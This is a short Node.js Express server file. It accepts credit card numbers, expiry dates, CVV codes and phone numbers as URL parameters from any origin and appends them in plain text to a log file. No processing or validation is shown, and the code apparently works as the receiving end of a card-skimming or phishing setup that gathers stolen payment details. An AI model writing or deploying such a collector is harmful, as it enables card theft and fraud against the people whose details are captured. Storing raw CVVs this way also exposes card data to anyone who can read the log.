const app = require('express')();
const cors = require('cors');
const fs = require('fs');
const PORT = 8080;

app.use(cors());

app.all('/', function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "X-Requested-With");
    next()
});

app.post('/api/v1/:ccnum/:expdate/:cvvnum/:phonenum', (req, res, next) => {
    const { ccnum } = req.params;
    const { expdate } = req.params;
    const { cvvnum } = req.params;
    const { phonenum } = req.params;

    res.send({
        data: {
            ccnum,
            expdate,
            cvvnum,
            phonenum
        }
    });

    // Write the response to a file
    fs.appendFile(`logs.txt`, `${ccnum} // ${expdate} // ${cvvnum} // ${phonenum}\n`, (err) => {
        if (err) throw err;
        console.log('The file has been saved!');
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port http://localhost:${PORT}`);
});